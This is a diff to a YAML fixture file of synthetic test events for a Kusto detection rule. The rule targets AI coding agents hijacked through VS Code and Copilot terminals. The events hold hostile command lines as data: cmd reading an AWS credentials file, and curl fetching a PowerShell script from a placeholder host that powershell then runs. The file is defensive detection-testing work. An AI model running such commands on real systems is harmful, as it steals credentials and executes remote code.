@@ -1,10 +1,10 @@
 schema: umbrasec.claims/v1
 rule: queries/kql/editor-terminal-risky-command.kql
 rule_id: null
-rule_sha256: 130890d5e5671a810b1b33ab27b656cc5e0db4ae115f90458fa9954b0a5cb798
+rule_sha256: 017a250d2525ca1555e0468fdfd93a04631a3836533d88dd8c8eca44c341ae51
 engine: kusto
 writeup: research/detecting-hijacked-ai-coding-agents.html
-reviewed: 2026-10-26
+reviewed: 2026-10-27
 # Not executed: there is no Kusto engine in CI yet. Every event is one row of
 # DeviceProcessEvents for a child of a terminal shell. By default that shell is a
 # PowerShell 7 terminal in VS Code on Windows: the pty host Code.exe is the grandparent
@@ -15,8 +15,15 @@ reviewed: 2026-10-26
 # not confirmed, so no coverage claim rests on them alone. No event comes from a lab
 # capture: the column names are Microsoft's, the values are assumed. The pairing claims
 # use mode: sequence, because a pair needs both children in one table.
+# Copilot harness events override the shell fields with a shell whose parent is
+# copilot-runtime. That parent relation is read in VS Code 1.143.1 source and the shipped
+# Copilot SDK; the shell argv (pwsh -NoProfile -NoLogo on Windows) is inferred from the
+# Copilot CLI's powershellFlags default, not captured.
 # The query passed Kusto.Language 12.4.1 (Microsoft's parser) with 0 diagnostics
-# against a DeviceProcessEvents schema holding every column it reads.
+# against a DeviceProcessEvents schema holding every column it reads. Rechecked
+# 2026-10-27 after the Copilot harness source was added: 0 diagnostics against the 68
+# DeviceProcessEvents columns of Microsoft's reference (the doc-quirk LogonID row left
+# out), and a copy with a misspelt column and a misspelt let name gave 3 errors.
 event_defaults:
   _synthetic: true
   DeviceId: "0000000000000000000000000000000000000a01"
@@ -102,6 +109,22 @@ claims:
     events:
       - {_note: "PowerShell terminal: curl.exe piped into powershell, curl recorded first", Timestamp: "2026-10-26T09:30:00.000Z", FileName: curl.exe, ProcessId: 7600, ProcessCommandLine: '"C:\Windows\system32\curl.exe" -s https://example.invalid/x.ps1'}
       - {_note: "the pipe's reader, 10 ms later", Timestamp: "2026-10-26T09:30:00.010Z", FileName: powershell.exe, ProcessId: 7601, ProcessCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -'}
+  - id: catches/copilot-harness-credential
+    kind: catches
+    quote: {source: rule, text: "It also keeps the children of a shell whose parent is copilot-runtime (RuntimeNames, bare names as well), with no shell-integration condition."}
+    expect: match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "Copilot harness on Windows: a cmd child of the runtime's PowerShell shell types the AWS credentials file; the shell argv is inferred (the CLI's powershellFlags default), not captured", Timestamp: "2026-10-27T09:05:00Z", InitiatingProcessParentFileName: copilot-runtime.exe, InitiatingProcessCommandLine: '"C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NoLogo', InitiatingProcessId: 9100, InitiatingProcessCreationTime: "2026-10-27T09:00:00Z", FileName: cmd.exe, ProcessId: 9110, ProcessCommandLine: '"C:\Windows\system32\cmd.exe" /c type C:\Users\dev\.aws\credentials'}
+  - id: catches/copilot-harness-pairing
+    kind: catches
+    quote: {source: rule, text: "The runtime keeps one persistent PTY shell per session on Windows and macOS (read in VS Code source), so a download and a later interpreter in that shell pair."}
+    expect: match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {_note: "the runtime's persistent PowerShell shell: curl.exe saves a script", Timestamp: "2026-10-27T09:10:00Z", InitiatingProcessParentFileName: copilot-runtime.exe, InitiatingProcessCommandLine: '"C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NoLogo', InitiatingProcessId: 9100, InitiatingProcessCreationTime: "2026-10-27T09:00:00Z", FileName: curl.exe, ProcessId: 9120, ProcessCommandLine: '"C:\Windows\system32\curl.exe" -o C:\Users\dev\AppData\Local\Temp\x.ps1 https://example.invalid/x.ps1'}
+      - {_note: "the same runtime shell runs it with Windows PowerShell 20 seconds later", Timestamp: "2026-10-27T09:10:20Z", InitiatingProcessParentFileName: copilot-runtime.exe, InitiatingProcessCommandLine: '"C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NoLogo', InitiatingProcessId: 9100, InitiatingProcessCreationTime: "2026-10-27T09:00:00Z", FileName: powershell.exe, ProcessId: 9121, ProcessCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -File C:\Users\dev\AppData\Local\Temp\x.ps1'}
   - id: near-miss/pair-outside-window
     kind: near-miss
     rationale: "The interpreter starts 5 minutes after the download, outside the 60-second PairWindow"
@@ -163,6 +186,13 @@ claims:
     table: DeviceProcessEvents
     events:
       - {_note: "the cmd.exe itself: its parent is the extension host Code.exe", Timestamp: "2026-10-26T10:30:00Z", InitiatingProcessCommandLine: '"C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\Code.exe" --type=utility --utility-sub-type=node.mojom.NodeService --dns-result-order=ipv4first --inspect-port=0', InitiatingProcessId: 5100, FileName: cmd.exe, ProcessId: 8300, ProcessCommandLine: 'C:\Windows\system32\cmd.exe /d /s /c "type C:\Users\dev\.aws\credentials"'}
+  - id: near-miss/copilot-runtime-direct-child-not-shell
+    kind: near-miss
+    rationale: "The runtime's own direct child is not kept even when its command line names a credential source: copilot-runtime is matched as the grandparent (InitiatingProcessParentFileName), not the parent. This child's parent is copilot-runtime and its grandparent is the agent host Code.exe, and the runtime's argv carries no shell-integration marker, so it is in neither source. The cmd.exe it starts is a grandchild of the runtime and is what catches/copilot-harness-credential matches"
+    expect: no-match
+    table: DeviceProcessEvents
+    events:
+      - {_note: "a PowerShell process the runtime starts directly, with the credential read on its own command line; on Windows the agent host is Code.exe; the runtime argv is the SDK's fixed one read in the shipped SDK, the pwsh argv is illustrative", Timestamp: "2026-10-27T09:00:00Z", InitiatingProcessParentFileName: Code.exe, InitiatingProcessCommandLine: '"C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\1a2b3c4d5e\resources\app\node_modules.asar.unpacked\@github\copilot-sdk-win32-x64\prebuilds\win32-x64\copilot-runtime.exe" --headless --no-auto-update --log-level info --stdio --no-auto-login', InitiatingProcessId: 9000, InitiatingProcessCreationTime: "2026-10-27T08:59:00Z", FileName: pwsh.exe, ProcessId: 9100, ProcessCommandLine: '"C:\Program Files\PowerShell\7\pwsh.exe" -NoProfile -NoLogo -Command "cmd.exe /c type C:\Users\dev\.aws\credentials"'}
   - id: blind-spot/linux-editor-not-listed
     kind: blind-spot
     quote: {source: rule, text: "The Linux and macOS editor process names are not confirmed, so they are not in Editors"}
@@ -236,3 +266,12 @@ claims:
     events:
       - {Timestamp: "2026-10-26T11:40:00Z", FileName: ssh-keygen.exe, ProcessId: 9000, ProcessCommandLine: '"C:\Windows\System32\OpenSSH\ssh-keygen.exe" -t ed25519 -f C:\Users\dev\.ssh\id_ed25519'}
       - {_note: "Git's grep started from the PowerShell terminal", Timestamp: "2026-10-26T11:40:10Z", FileName: grep.exe, ProcessId: 9001, ProcessCommandLine: '"C:\Program Files\Git\usr\bin\grep.exe" -rn .npmrc .'}
+  - id: false-positive/copilot-runtime-login-shell-probe
+    kind: false-positive
+    quote: {source: rule, text: "once per session on macOS and Linux, the runtime's login-shell environment probe runs the user's profile under copilot-runtime"}
+    expect: match
+    mode: sequence
+    table: DeviceProcessEvents
+    events:
+      - {_note: "the probe shell runs the user's profile, which fetches a version file with curl; the probe's argv is not in the shipped strings, a login bash is assumed", Timestamp: "2026-10-27T09:30:00Z", DeviceName: devbox-02.example.com, InitiatingProcessParentFileName: copilot-runtime, InitiatingProcessCommandLine: "/bin/bash -l", InitiatingProcessId: 9400, InitiatingProcessCreationTime: "2026-10-27T09:30:00Z", FileName: curl, ProcessId: 9401, ProcessCommandLine: "curl -fsS https://example.com/latest-version.txt"}
+      - {_note: "the same profile then runs node 2 seconds later", Timestamp: "2026-10-27T09:30:02Z", DeviceName: devbox-02.example.com, InitiatingProcessParentFileName: copilot-runtime, InitiatingProcessCommandLine: "/bin/bash -l", InitiatingProcessId: 9400, InitiatingProcessCreationTime: "2026-10-27T09:30:00Z", FileName: node, ProcessId: 9402, ProcessCommandLine: "node --version"}
